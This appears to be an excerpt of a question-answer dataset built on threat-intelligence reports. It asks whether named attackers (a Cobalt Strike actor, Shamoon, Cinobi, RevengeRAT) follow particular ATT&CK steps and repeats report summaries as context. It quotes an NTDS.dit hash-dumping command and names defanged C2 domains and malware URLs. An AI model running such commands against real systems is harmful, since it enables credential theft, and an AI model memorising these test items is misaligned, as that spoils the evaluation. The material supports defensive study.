Exfiltration: The adversary uses the command and control channel to exfiltrate small amounts of data. This is usually information containing account details. For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else. Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool. This tool exfiltrates specified files to cloud storage web services. The following cloud storage web services are supported by the malware: Dropbox, Google Drive, OneDrive.",Yes,research.nccgroup.com-Abusing cloud services to fly under the radar
2305,385,385-Collection-T1213-Data from Information Repositories,"After performing lateral movement to deploy Cobalt Strike beacons on newly compromised systems and identifying data of interest through further discovery, is it likely that the adversary will collect data from information repositories, such as using Microsoft SharePoint Online, before exfiltrating staged and compressed data to cloud storage web services like Dropbox or OneDrive?","Collection: In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim's network. As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case. This document was exfiltrated and used to continue the intrusion via a company portal and VPN. In all cases we've seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems. But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems.","Initial Access: This adversary starts with obtaining usernames and passwords of their victim from previous breaches. These credentials are used in a credential stuffing or password spraying attack against the victim's remote services, such as webmail or other internet reachable mail services. After obtaining a valid account, they use this account to access the victim's VPN, Citrix or another remote service that allows access to the network of the victim. Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.
Execution: The adversary installs Cobalt Strike, a framework designed for adversary simulation intended for penetration testers and red teams, which has been widely adopted by malicious threats. The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner. At least three versions of Cobalt Strike have been in use by the adversary: v3.8, v3.12, and v3.14. The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.
Persistence: The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system. Once the system is rebooted, the beacon is gone. The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as servers. Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.
Privilege Escalation: The adversary started a password spraying attack against domain admin accounts, and successfully got a valid domain admin account this way. In other cases, the adversary moved laterally to another system with a domain admin logged in. They used a tool called NtdsAudit to dump the password hashes of domain users as well as observed the following command: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv. Both ntdsutil and esentutl are by default installed on a domain controller.
Defense Evasion: The adversary attempts to clean-up some of the traces from their intrusions. While we don't know what was deleted and we were unable to recover, we did see some of their anti-forensics activity: Windows event logs clearing, File deletion, Timestomping. For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command. This tool is included in the UnxUtils repository. This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.
Credential Access: The adversary achieves credentials access by brute force, and more specifically by credential stuffing or password spraying. The traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>. While usernames for legitimate logins at the victim's network were generally formatted like <domain>\<username>. And attempted logins came from a relative small set of IP-addresses.
Discovery: The adversary applied a wide range of discovery tactics. In the list below we have highlighted a few specific tools the adversary used for discovery purposes. You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article. Account discovery tool: PsLogList Command used: psloglist.exe -accepteula -x security -s -a <date> This command exports a text file with comma separated fields. The text files contain the contents of the Security Event log after the specified date. Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft). The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file. A possible intent of the adversary could be to identify if privileged users are active on the systems. If such a privileged user was recently active on a server the actor executes Cobalt Strike's built-in Mimikatz to dump its credentials or password hash.
Lateral Movement: The adversary used the built-in lateral movement possibilities in Cobalt Strike. Cobalt Strike has various methods for deploying its beacons at newly compromised systems. We have seen the adversary using SMB, named pipes, PsExec, and WinRM. The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim's network. They continue lateral movement and discovery in an attempt to identify the data of interest. This could be a webserver to carve PII from memory, or a fileserver to copy IP, as we have both observed.
Command and Control: The adversary uses Cobalt Strike as framework to manage their compromised systems. We observed the use of Cobalt Strike's C2 protocol encapsulated in DNS by the adversary in 2017 and 2018. They switched to C2 encapsulated in HTTPS in Q3 2019. An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike. This is important to note because the functionalities of Cobalt Strike's trial version are limited. More importantly: the trial version doesn't support encryption of command and control traffic in cases where the protocol itself isn't encrypted, such as DNS.
Exfiltration: The adversary uses the command and control channel to exfiltrate small amounts of data. This is usually information containing account details. For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else. Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool. This tool exfiltrates specified files to cloud storage web services. The following cloud storage web services are supported by the malware: Dropbox, Google Drive, OneDrive.",Yes,research.nccgroup.com-Abusing cloud services to fly under the radar
2306,385,385-Collection-T1005-Data from Local System,"After using Cobalt Strike's built-in Mimikatz to dump credentials found during the discovery phase, is it likely that the adversary will copy the results of the discovery phase, such as local file- and directory lists, in preparation for exfiltration after achieving collection by gathering data from local systems?","Collection: In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim's network. As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case. This document was exfiltrated and used to continue the intrusion via a company portal and VPN. In all cases we've seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems. But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems.","Initial Access: This adversary starts with obtaining usernames and passwords of their victim from previous breaches. These credentials are used in a credential stuffing or password spraying attack against the victim's remote services, such as webmail or other internet reachable mail services. After obtaining a valid account, they use this account to access the victim's VPN, Citrix or another remote service that allows access to the network of the victim. Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.
Execution: The adversary installs Cobalt Strike, a framework designed for adversary simulation intended for penetration testers and red teams, which has been widely adopted by malicious threats. The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner. At least three versions of Cobalt Strike have been in use by the adversary: v3.8, v3.12, and v3.14. The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.
Persistence: The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system. Once the system is rebooted, the beacon is gone. The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as servers. Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.
Privilege Escalation: The adversary started a password spraying attack against domain admin accounts, and successfully got a valid domain admin account this way. In other cases, the adversary moved laterally to another system with a domain admin logged in. They used a tool called NtdsAudit to dump the password hashes of domain users as well as observed the following command: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv. Both ntdsutil and esentutl are by default installed on a domain controller.
Defense Evasion: The adversary attempts to clean-up some of the traces from their intrusions. While we don't know what was deleted and we were unable to recover, we did see some of their anti-forensics activity: Windows event logs clearing, File deletion, Timestomping. For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command. This tool is included in the UnxUtils repository. This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.
Credential Access: The adversary achieves credentials access by brute force, and more specifically by credential stuffing or password spraying. The traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>. While usernames for legitimate logins at the victim's network were generally formatted like <domain>\<username>. And attempted logins came from a relative small set of IP-addresses.
Discovery: The adversary applied a wide range of discovery tactics. In the list below we have highlighted a few specific tools the adversary used for discovery purposes. You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article. Account discovery tool: PsLogList Command used: psloglist.exe -accepteula -x security -s -a <date> This command exports a text file with comma separated fields. The text files contain the contents of the Security Event log after the specified date. Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft). The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file. A possible intent of the adversary could be to identify if privileged users are active on the systems. If such a privileged user was recently active on a server the actor executes Cobalt Strike's built-in Mimikatz to dump its credentials or password hash.
Lateral Movement: The adversary used the built-in lateral movement possibilities in Cobalt Strike. Cobalt Strike has various methods for deploying its beacons at newly compromised systems. We have seen the adversary using SMB, named pipes, PsExec, and WinRM. The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim's network. They continue lateral movement and discovery in an attempt to identify the data of interest. This could be a webserver to carve PII from memory, or a fileserver to copy IP, as we have both observed.
Command and Control: The adversary uses Cobalt Strike as framework to manage their compromised systems. We observed the use of Cobalt Strike's C2 protocol encapsulated in DNS by the adversary in 2017 and 2018. They switched to C2 encapsulated in HTTPS in Q3 2019. An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike. This is important to note because the functionalities of Cobalt Strike's trial version are limited. More importantly: the trial version doesn't support encryption of command and control traffic in cases where the protocol itself isn't encrypted, such as DNS.
Exfiltration: The adversary uses the command and control channel to exfiltrate small amounts of data. This is usually information containing account details. For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else. Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool. This tool exfiltrates specified files to cloud storage web services. The following cloud storage web services are supported by the malware: Dropbox, Google Drive, OneDrive.",Yes,research.nccgroup.com-Abusing cloud services to fly under the radar
2307,385,385-Collection-T1039-Data from Network Shared Drive,"After leveraging built-in lateral movement capabilities in Cobalt Strike to identify target systems and data of interest, is it likely that the adversary will copy results of the discovery phase, such as file and directory lists from network shared drives, before exfiltrating this data using cloud storage web services?","Collection: In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim's network. As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case. This document was exfiltrated and used to continue the intrusion via a company portal and VPN. In all cases we've seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems. But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems.","Initial Access: This adversary starts with obtaining usernames and passwords of their victim from previous breaches. These credentials are used in a credential stuffing or password spraying attack against the victim's remote services, such as webmail or other internet reachable mail services. After obtaining a valid account, they use this account to access the victim's VPN, Citrix or another remote service that allows access to the network of the victim. Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.
Execution: The adversary installs Cobalt Strike, a framework designed for adversary simulation intended for penetration testers and red teams, which has been widely adopted by malicious threats. The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner. At least three versions of Cobalt Strike have been in use by the adversary: v3.8, v3.12, and v3.14. The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.
Persistence: The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system. Once the system is rebooted, the beacon is gone. The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as servers. Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.
Privilege Escalation: The adversary started a password spraying attack against domain admin accounts, and successfully got a valid domain admin account this way. In other cases, the adversary moved laterally to another system with a domain admin logged in. They used a tool called NtdsAudit to dump the password hashes of domain users as well as observed the following command: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv. Both ntdsutil and esentutl are by default installed on a domain controller.
Defense Evasion: The adversary attempts to clean-up some of the traces from their intrusions. While we don't know what was deleted and we were unable to recover, we did see some of their anti-forensics activity: Windows event logs clearing, File deletion, Timestomping. For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command. This tool is included in the UnxUtils repository. This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.
Credential Access: The adversary achieves credentials access by brute force, and more specifically by credential stuffing or password spraying. The traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>. While usernames for legitimate logins at the victim's network were generally formatted like <domain>\<username>. And attempted logins came from a relative small set of IP-addresses.
Discovery: The adversary applied a wide range of discovery tactics. In the list below we have highlighted a few specific tools the adversary used for discovery purposes. You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article. Account discovery tool: PsLogList Command used: psloglist.exe -accepteula -x security -s -a <date> This command exports a text file with comma separated fields. The text files contain the contents of the Security Event log after the specified date. Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft). The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file. A possible intent of the adversary could be to identify if privileged users are active on the systems. If such a privileged user was recently active on a server the actor executes Cobalt Strike's built-in Mimikatz to dump its credentials or password hash.
Lateral Movement: The adversary used the built-in lateral movement possibilities in Cobalt Strike. Cobalt Strike has various methods for deploying its beacons at newly compromised systems. We have seen the adversary using SMB, named pipes, PsExec, and WinRM. The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim's network. They continue lateral movement and discovery in an attempt to identify the data of interest. This could be a webserver to carve PII from memory, or a fileserver to copy IP, as we have both observed.
Command and Control: The adversary uses Cobalt Strike as framework to manage their compromised systems. We observed the use of Cobalt Strike's C2 protocol encapsulated in DNS by the adversary in 2017 and 2018. They switched to C2 encapsulated in HTTPS in Q3 2019. An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike. This is important to note because the functionalities of Cobalt Strike's trial version are limited. More importantly: the trial version doesn't support encryption of command and control traffic in cases where the protocol itself isn't encrypted, such as DNS.
Exfiltration: The adversary uses the command and control channel to exfiltrate small amounts of data. This is usually information containing account details. For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else. Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool. This tool exfiltrates specified files to cloud storage web services. The following cloud storage web services are supported by the malware: Dropbox, Google Drive, OneDrive.",Yes,research.nccgroup.com-Abusing cloud services to fly under the radar
2308,385,385-Collection-T1114-Email Collection,"After identifying privileged users during the discovery phase through the use of the PsLogList tool, is it likely that the adversary would collect email messages from both local and remote systems as part of their collection activities?","Collection: In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim's network. As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case. This document was exfiltrated and used to continue the intrusion via a company portal and VPN. In all cases we've seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems. But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems.","Initial Access: This adversary starts with obtaining usernames and passwords of their victim from previous breaches. These credentials are used in a credential stuffing or password spraying attack against the victim's remote services, such as webmail or other internet reachable mail services. After obtaining a valid account, they use this account to access the victim's VPN, Citrix or another remote service that allows access to the network of the victim. Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.
Execution: The adversary installs Cobalt Strike, a framework designed for adversary simulation intended for penetration testers and red teams, which has been widely adopted by malicious threats. The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner. At least three versions of Cobalt Strike have been in use by the adversary: v3.8, v3.12, and v3.14. The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.
Persistence: The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system. Once the system is rebooted, the beacon is gone. The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as servers. Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.
Privilege Escalation: The adversary started a password spraying attack against domain admin accounts, and successfully got a valid domain admin account this way. In other cases, the adversary moved laterally to another system with a domain admin logged in. They used a tool called NtdsAudit to dump the password hashes of domain users as well as observed the following command: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv. Both ntdsutil and esentutl are by default installed on a domain controller.
Defense Evasion: The adversary attempts to clean-up some of the traces from their intrusions. While we don't know what was deleted and we were unable to recover, we did see some of their anti-forensics activity: Windows event logs clearing, File deletion, Timestomping. For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command. This tool is included in the UnxUtils repository. This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.
Credential Access: The adversary achieves credentials access by brute force, and more specifically by credential stuffing or password spraying. The traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>. While usernames for legitimate logins at the victim's network were generally formatted like <domain>\<username>. And attempted logins came from a relative small set of IP-addresses.
Discovery: The adversary applied a wide range of discovery tactics. In the list below we have highlighted a few specific tools the adversary used for discovery purposes. You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article. Account discovery tool: PsLogList Command used: psloglist.exe -accepteula -x security -s -a <date> This command exports a text file with comma separated fields. The text files contain the contents of the Security Event log after the specified date. Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft). The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file. A possible intent of the adversary could be to identify if privileged users are active on the systems. If such a privileged user was recently active on a server the actor executes Cobalt Strike's built-in Mimikatz to dump its credentials or password hash.
Lateral Movement: The adversary used the built-in lateral movement possibilities in Cobalt Strike. Cobalt Strike has various methods for deploying its beacons at newly compromised systems. We have seen the adversary using SMB, named pipes, PsExec, and WinRM. The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim's network. They continue lateral movement and discovery in an attempt to identify the data of interest. This could be a webserver to carve PII from memory, or a fileserver to copy IP, as we have both observed.
Command and Control: The adversary uses Cobalt Strike as framework to manage their compromised systems. We observed the use of Cobalt Strike's C2 protocol encapsulated in DNS by the adversary in 2017 and 2018. They switched to C2 encapsulated in HTTPS in Q3 2019. An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike. This is important to note because the functionalities of Cobalt Strike's trial version are limited. More importantly: the trial version doesn't support encryption of command and control traffic in cases where the protocol itself isn't encrypted, such as DNS.
Exfiltration: The adversary uses the command and control channel to exfiltrate small amounts of data. This is usually information containing account details. For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else. Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool. This tool exfiltrates specified files to cloud storage web services. The following cloud storage web services are supported by the malware: Dropbox, Google Drive, OneDrive.",Yes,research.nccgroup.com-Abusing cloud services to fly under the radar
2310,385,385-Exfiltration-T1041-Exfiltration Over C2 Channel,"Prior to exfiltrating account details over the command and control channel, is it likely that the adversary copied data such as file- and directory lists, network shared drives, file shares, and email mailboxes during the collection phase after conducting coordinated lateral movement using Cobalt Strike's SMB, named pipes, PsExec, and WinRM?","Exfiltration: The adversary uses the command and control channel to exfiltrate small amounts of data. This is usually information containing account details. For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else. Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool. This tool exfiltrates specified files to cloud storage web services. The following cloud storage web services are supported by the malware: Dropbox, Google Drive, OneDrive.","Initial Access: This adversary starts with obtaining usernames and passwords of their victim from previous breaches. These credentials are used in a credential stuffing or password spraying attack against the victim's remote services, such as webmail or other internet reachable mail services. After obtaining a valid account, they use this account to access the victim's VPN, Citrix or another remote service that allows access to the network of the victim. Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.
Execution: The adversary installs Cobalt Strike, a framework designed for adversary simulation intended for penetration testers and red teams, which has been widely adopted by malicious threats. The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner. At least three versions of Cobalt Strike have been in use by the adversary: v3.8, v3.12, and v3.14. The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.
Persistence: The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system. Once the system is rebooted, the beacon is gone. The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as servers. Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.
Privilege Escalation: The adversary started a password spraying attack against domain admin accounts, and successfully got a valid domain admin account this way. In other cases, the adversary moved laterally to another system with a domain admin logged in. They used a tool called NtdsAudit to dump the password hashes of domain users as well as observed the following command: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv. Both ntdsutil and esentutl are by default installed on a domain controller.
Defense Evasion: The adversary attempts to clean-up some of the traces from their intrusions. While we don't know what was deleted and we were unable to recover, we did see some of their anti-forensics activity: Windows event logs clearing, File deletion, Timestomping. For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command. This tool is included in the UnxUtils repository. This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.
Credential Access: The adversary achieves credentials access by brute force, and more specifically by credential stuffing or password spraying. The traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>. While usernames for legitimate logins at the victim's network were generally formatted like <domain>\<username>. And attempted logins came from a relative small set of IP-addresses.
Discovery: The adversary applied a wide range of discovery tactics. In the list below we have highlighted a few specific tools the adversary used for discovery purposes. You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article. Account discovery tool: PsLogList Command used: psloglist.exe -accepteula -x security -s -a <date> This command exports a text file with comma separated fields. The text files contain the contents of the Security Event log after the specified date. Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft). The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file. A possible intent of the adversary could be to identify if privileged users are active on the systems. If such a privileged user was recently active on a server the actor executes Cobalt Strike's built-in Mimikatz to dump its credentials or password hash.
Lateral Movement: The adversary used the built-in lateral movement possibilities in Cobalt Strike. Cobalt Strike has various methods for deploying its beacons at newly compromised systems. We have seen the adversary using SMB, named pipes, PsExec, and WinRM. The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim's network. They continue lateral movement and discovery in an attempt to identify the data of interest. This could be a webserver to carve PII from memory, or a fileserver to copy IP, as we have both observed.
Collection: In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim's network. As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case. This document was exfiltrated and used to continue the intrusion via a company portal and VPN. In all cases we've seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems. But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems.
Command and Control: The adversary uses Cobalt Strike as framework to manage their compromised systems. We observed the use of Cobalt Strike's C2 protocol encapsulated in DNS by the adversary in 2017 and 2018. They switched to C2 encapsulated in HTTPS in Q3 2019. An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike. This is important to note because the functionalities of Cobalt Strike's trial version are limited. More importantly: the trial version doesn't support encryption of command and control traffic in cases where the protocol itself isn't encrypted, such as DNS.",Yes,research.nccgroup.com-Abusing cloud services to fly under the radar
2320,386,386-Defense Evasion-T1006-Direct Volume Access,"After Shamoon malware executes a copy of itself as a scheduled job and drops a driver for disk access during execution, is it likely that the malware will overwrite the Volume Boot Record as part of its Defense Evasion tactic?","Defense Evasion: Shamoon malware's wiping function overwrites data within the Documents and Settings folder followed by the System32 folder, and then starts physical disk access to begin wiping at the disk level. The malware also overwrites the disk's boot records, including the Master Boot Record (MBR) and Volume Boot Record (VBR), to prevent access to the affected file systems.","Initial Access: The Shamoon malware was deployed against certain entities around August 15, 2012. It was designed to overwrite data on disks attached to or accessible from targeted systems. The malware executed as a scheduled job, entrenched itself as a service, and dropped a driver that facilitated disk access to overwrite disk data, including the contents of the Documents and Settings and Windows\system32 directories.
Execution: Shamoon malware executes a copy of itself as a scheduled job, deletes the file created for the job, entrenches itself as a service, and executes the entrenched file resulting in a dropped driver. The dropped driver is then loaded and executed, facilitating disk access for the malware's destructive operations.
Persistence: Shamoon entrenches itself as a service on the infected system, which is a method used to maintain persistence on the host.
Command and Control: Fidelis researchers have developed rules for detecting Shamoon malware along the entire threat life cycle, including initial infection, lateral propagation, and command and control communication. The embedded malware detection engine recognizes the variant of Shamoon malware analyzed.
Impact: Shamoon malware's impact includes overwriting data on disks, targeting user data first, then system data, and eventually overwriting the disk's boot records. This results in the prevention of accessing the targeted file system and substantial amounts of file data being overwritten.
Others: Recovery efforts for Shamoon-infected file systems were successful due to the malware's inability to completely wipe the disk before the infected host restarted. This allowed for the recovery of the majority of files outside of the System32 and Documents and Settings folders. Fidelis researchers tested several strategies for VBR and file system recovery, finding that the Master File Table (MFT) was mostly intact and that a backup copy of the VBR could be used to rebuild the file system. The recovery process is detailed, including the use of forensic software like EnCase and hex editors to restore the file system and recover relevant artifacts for forensic examination.",Yes,FTA 1007 - Shamoon
2321,386,386-Impact-T1485-Data Destruction,"After Shamoon malware entrenches itself as a service for persistence and executes the entrenched file resulting in a dropped driver for its destructive operations, is it likely that Shamoon will eventually overwrite disk's boot records to prevent access to the targeted file system and target both user and system data?","Impact: Shamoon malware's impact includes overwriting data on disks, targeting user data first, then system data, and eventually overwriting the disk's boot records. This results in the prevention of accessing the targeted file system and substantial amounts of file data being overwritten.","Initial Access: The Shamoon malware was deployed against certain entities around August 15, 2012. It was designed to overwrite data on disks attached to or accessible from targeted systems. The malware executed as a scheduled job, entrenched itself as a service, and dropped a driver that facilitated disk access to overwrite disk data, including the contents of the Documents and Settings and Windows\system32 directories.
Execution: Shamoon malware executes a copy of itself as a scheduled job, deletes the file created for the job, entrenches itself as a service, and executes the entrenched file resulting in a dropped driver. The dropped driver is then loaded and executed, facilitating disk access for the malware's destructive operations.
Persistence: Shamoon entrenches itself as a service on the infected system, which is a method used to maintain persistence on the host.
Defense Evasion: Shamoon malware's wiping function overwrites data within the Documents and Settings folder followed by the System32 folder, and then starts physical disk access to begin wiping at the disk level. The malware also overwrites the disk's boot records, including the Master Boot Record (MBR) and Volume Boot Record (VBR), to prevent access to the affected file systems.
Command and Control: Fidelis researchers have developed rules for detecting Shamoon malware along the entire threat life cycle, including initial infection, lateral propagation, and command and control communication. The embedded malware detection engine recognizes the variant of Shamoon malware analyzed.
Others: Recovery efforts for Shamoon-infected file systems were successful due to the malware's inability to completely wipe the disk before the infected host restarted. This allowed for the recovery of the majority of files outside of the System32 and Documents and Settings folders. Fidelis researchers tested several strategies for VBR and file system recovery, finding that the Master File Table (MFT) was mostly intact and that a backup copy of the VBR could be used to rebuild the file system. The recovery process is detailed, including the use of forensic software like EnCase and hex editors to restore the file system and recover relevant artifacts for forensic examination.",Yes,FTA 1007 - Shamoon
2325,387,387-Defense Evasion-T1036-Masquerading,"After Cinobi escalates privileges during the third stage of infection using a UAC bypass via the CMSTPLUA COM interface, is it likely that it will download legitimate applications, rename them (e.g., tor.exe renamed to taskhost.exe), and adjust their usage for defense evasion before stealing banking credentials through form-grabbing and web traffic modifications within victims' web browsers?","Defense Evasion: Cinobi employs defense evasion by downloading legitimate applications and renaming them, such as changing tor.exe to taskhost.exe. It also removes files from the '\AppData\LocalLow\' directory and the original dropper file to evade detection.","Initial Access: Operation Overtrap, active since April 2019, targets Japanese online banking users. It employs three methods to gain initial access: phishing links in spam emails leading to fake banking websites, executable malware downloads from phishing pages, and malvertising that delivers malware via a custom exploit kit named Bottle Exploit Kit.
Execution: The Bottle Exploit Kit, used by Operation Overtrap, exploits vulnerabilities CVE-2018-15982 and CVE-2018-8174 to execute code on victims' systems. The malware, Cinobi, has a multi-stage infection process involving position-independent shellcode and encrypted payloads, complicating analysis.
Persistence: Cinobi establishes persistence by copying itself to the '%PUBLIC%' folder and installing as a Winsock Layered Service Provider. It modifies the spooler service configuration to 'SERVICE_AUTO_START' and disables several services, including UsoSvc, Wuauserv, WaaSMedicSvc, SecurityHealthService, and DisableAntiSpyware.
Privilege Escalation: Cinobi uses a UAC bypass method via the CMSTPLUA COM interface during its third stage of infection to escalate privileges.
Credential Access: Cinobi, the banking trojan used in Operation Overtrap, is designed to steal banking credentials by compromising victims' web browsers for form-grabbing and modifying web traffic to and from targeted Japanese banking websites.
Command and Control: Cinobi communicates with its command-and-control (C&C) server over the Tor proxy, downloading various stages of the malware and configuration files from a .onion C&C address.
Others: Trend Micro's analysis of Operation Overtrap reveals that it has been active since April 2019, targeting Japanese online banking users. The campaign uses a custom exploit kit, Bottle Exploit Kit, to deliver a new banking trojan named Cinobi. Cinobi's capabilities include form-grabbing, web traffic modification, and communication over the Tor proxy. The malware's infection process is multi-staged and includes encrypted shellcode. Trend Micro recommends best practices such as updating systems, using firewalls, intrusion detection and prevention systems, and endpoint solutions to protect against such threats.",Yes,Operation Overtrap Targets Japanese Online Banking Users Via Bottle Exploit Kit and Brand-New Cinobi Banking Trojan
2338,389,389-Command and Control-T1071-Application Layer Protocol,"After establishing persistence through a scheduled task that executes 'mshta.exe' with a malicious URL every two hours, is it likely that RevengeRAT will establish communication with its command and control servers and send victim machine information to domains such as 'office365update[.]duckdns.org' and 'systen32.ddns[.]net' while the attacker's infrastructure is identified to be located in Canada and Brazil?","Command and Control: The 'RevengeRAT' payload, once executed, established communication with its command and control servers, sending victim machine information to two different C2 destinations: 'office365update[.]duckdns.org' and 'systen32.ddns[.]net'. If one server was down, the malware would fall back to the other. Both C2 servers were unresponsive at the time of writing, but their IP resolutions suggested that the attacker's infrastructure could be located in Canada and Brazil.","Initial Access: The Cybaze-Yoroi ZLab researchers discovered a malware campaign targeting the Italian automotive sector, delivered via a phishing email impersonating a senior partner of the Brazilian law firm 'Veirano Advogados'. The email contained a PowerPoint add-in document with a '.ppa' extension, which included an auto-open VBA macro designed to execute further malicious activities.
Execution: The VBA macro within the '.ppa' file used the 'mshta.exe' tool to download and execute a dropper from a Blogspot URL. The downloaded web page, while appearing benign, concealed VBScript code in an invisible blog post. This script was falsely attributed to 'Microsoft Corp.' and was responsible for executing a series of malicious actions, including storing a base64 encoded version of the 'RevengeRAT' payload in the registry, decoding and executing the payload, and creating and executing another VBScript to download a new payload from 'hxxp://cdtmaster.com[.]br'.
Persistence: The malware established persistence by creating a scheduled task to run the 'mshta.exe' utility with the URL 'hxxps://pocasideiascdt.blogspot[.]com/' every two hours, ensuring continuous execution of the malicious code.
